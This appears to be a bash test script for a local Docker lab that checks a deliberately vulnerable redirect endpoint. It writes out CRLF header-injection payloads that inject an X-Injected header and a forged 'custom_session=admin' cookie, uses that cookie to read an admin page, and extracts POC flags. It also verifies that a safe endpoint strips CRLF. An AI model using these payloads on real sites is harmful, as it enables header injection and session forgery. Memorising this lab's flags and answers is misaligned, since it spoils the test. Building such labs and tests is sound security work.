#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 3

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8096 2>/dev/null; do sleep 1; done

# Test 1: normal redirect sets Location without injection
OUT=$(curl -si http://127.0.0.1:8096/redirect?url=%2Fhome 2>/dev/null)
check "normal redirect sets Location: /home" "$( echo "$OUT" | grep -qi 'Location: /home' && echo 1 || echo 0 )"
check "no extra headers injected on normal request" "$( echo "$OUT" | grep -qi 'X-Injected' && echo 0 || echo 1 )"

# Test 2: CRLF injection injects X-Injected header
# url = /safe\r\nX-Injected: hacked
INJECTED_URL=$(python3 -c "import urllib.parse; print(urllib.parse.quote('/safe\r\nX-Injected: hacked', safe='/'))")
OUT=$(curl -si "http://127.0.0.1:8096/redirect?url=$INJECTED_URL" 2>/dev/null)
check "CRLF injection creates X-Injected header" "$( echo "$OUT" | grep -qi 'X-Injected: hacked' && echo 1 || echo 0 )"

# Test 3: get flag1 from /check-injection with injected header
OUT=$(curl -s -H "X-Injected: test" http://127.0.0.1:8096/check-injection 2>/dev/null)
FLAG1=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "check-injection returns flag1 when X-Injected present" "$( [ -n "$FLAG1" ] && echo 1 || echo 0 )"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"

# Test 4: CRLF injection injects Set-Cookie header
COOKIE_URL=$(python3 -c "import urllib.parse; print(urllib.parse.quote('/safe\r\nSet-Cookie: custom_session=admin', safe='/'))")
OUT=$(curl -si "http://127.0.0.1:8096/redirect?url=$COOKIE_URL" 2>/dev/null)
check "CRLF injection creates Set-Cookie header" "$( echo "$OUT" | grep -qi 'Set-Cookie: custom_session=admin' && echo 1 || echo 0 )"

# Test 5: flag2 from /admin with injected cookie
OUT=$(curl -s -H "Cookie: custom_session=admin" http://127.0.0.1:8096/admin 2>/dev/null)
FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "admin returns flag2 with custom_session=admin cookie" "$( [ -n "$FLAG2" ] && echo 1 || echo 0 )"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

# Test 6: safe-redirect strips CRLF
OUT=$(curl -si "http://127.0.0.1:8096/safe-redirect?url=$INJECTED_URL" 2>/dev/null)
check "safe-redirect strips injected header" "$( echo "$OUT" | grep -qi '^X-Injected' && echo 0 || echo 1 )"

$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
